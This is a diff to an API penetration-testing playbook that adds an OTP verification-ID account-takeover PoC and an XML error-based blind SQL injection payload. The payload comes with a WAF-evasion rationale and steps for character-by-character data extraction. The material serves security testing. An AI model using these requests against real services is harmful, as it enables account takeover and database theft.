@@ -6,8 +6,14 @@
 - recon-basic.md
 - parser-differential-tester.md
 - ai-self-validator.md
+- (OPTIONAL: route to `08-otp-auth-bypass.md` if auth/OTP endpoints detected)
 
 **Expected Time:** 2-3 hours per API
+
+**New in 2026-05-25 update:**
+- Phase 2.4: OTP / Auth Bypass (Entry #178, #183)
+- Phase 3.5: XML Error-Based Blind SQLi (Entry #179)
+- Phase 7: AI Scanner SSRF if API is consumed by a scanner (Entry #182)
 
 ---
 
@@ -140,6 +146,39 @@ curl -X PUT https://target.com/api/user/123 \
 # Vulnerable: role/is_admin accepted → privilege escalation
 ```
 
+### Step 2.4: OTP / Stateless Verification Bypass (NEW — Entries #178, #183)
+
+**For any auth endpoint that issues a `verificationId`:** test if it's bound to user identity.
+
+**Common endpoints to test:**
+- `POST /api/auth/email` → `PUT /api/auth/email` (OTP login)
+- `POST /api/auth/reset` → `PUT /api/auth/reset` (password reset)
+- `POST /api/auth/verify` → `PUT /api/auth/verify` (email verification)
+
+**PoC (entry #178/#183 pattern):**
+```bash
+# Step 1: Attacker initiates flow
+curl -X POST https://target.com/api/auth/email \
+  -H "Content-Type: application/json" \
+  -d '{"loginId":"attacker@you.com"}'
+# Response: {"verificationId":"KC:6BE2..."}
+# Attacker receives OTP via email
+
+# Step 2: At verification, swap identity to victim
+curl -X PUT https://target.com/api/auth/email \
+  -H "Content-Type: application/json" \
+  -d '{
+    "loginId":"victim@target.com",
+    "otp_code":"<attacker valid code>",
+    "verificationId":"KC:6BE2..."
+  }'
+# Vulnerable: 200 OK + victim's full token suite
+```
+
+> **For comprehensive OTP testing:** route to `08-otp-auth-bypass.md`
+
+**Source:** Entries #178, #183
+
 ---
 
 ## Phase 3: Injection Testing (30-45 min)
@@ -206,6 +245,37 @@ curl -X POST https://target.com/graphql \
   -H "Content-Type: application/json" \
   -d '{"query": "{ user { posts { comments { author { posts { comments { ... } } } } } } }"}'
 ```
+
+### Step 3.5: XML Error-Based Blind SQLi (NEW — Entry #179)
+
+**For when sqlmap reports false positive but you know injection exists.** Make the database answer yes/no questions by crashing on purpose.
+
+**The Trick:**
+- WAF watches for SQL keywords, not XML errors
+- Wrap `CASE WHEN` around XML casts
+- If condition true: parses broken XML → throws HTTP 500
+- If condition false: parses clean XML → returns HTTP 200
+
+**PoC pattern:**
+```sql
+CASE WHEN (condition)
+  THEN XMLAgg(XMLElement("root", '<'))
+  ELSE XMLAgg(XMLElement("root", '/'))
+END
+```
+
+**Test:**
+```bash
+# Try in known-injectable param
+curl "https://target.com/api/search?q=test%27)%20AND%201=CASE%20WHEN%20(1=1)%20THEN%20XMLAgg(XMLElement(%22root%22,%20%27%3C%27))%20ELSE%20XMLAgg(XMLElement(%22root%22,%20%27/%27))%20END--"
+
+# 1=1 branch: HTTP 500
+# 1=2 branch: HTTP 200
+```
+
+**Build YES/NO oracle character-by-character** for database/schema extraction.
+
+**Source:** Entry #179
 
 ---
 
@@ -486,3 +556,7 @@ curl https://target.com/api/user/$ACCOUNT_B_ID \
 - Entry #4: Yandex Dorking (API discovery)
 - Entry #57: Parser Differentials
 - Entry #5: AI Self-Validation
+- **Entry #178: OTP Bypass via Stateless Verification ID**
+- **Entry #183: Full ATO via OTP Verification Logic Flaw ($3k)**
+- **Entry #179: XML Error-Based Blind SQLi (DeepSeek V4 Pro trick)**
+- **Workflow 08: OTP / Auth-Flow Bypass (comprehensive)**
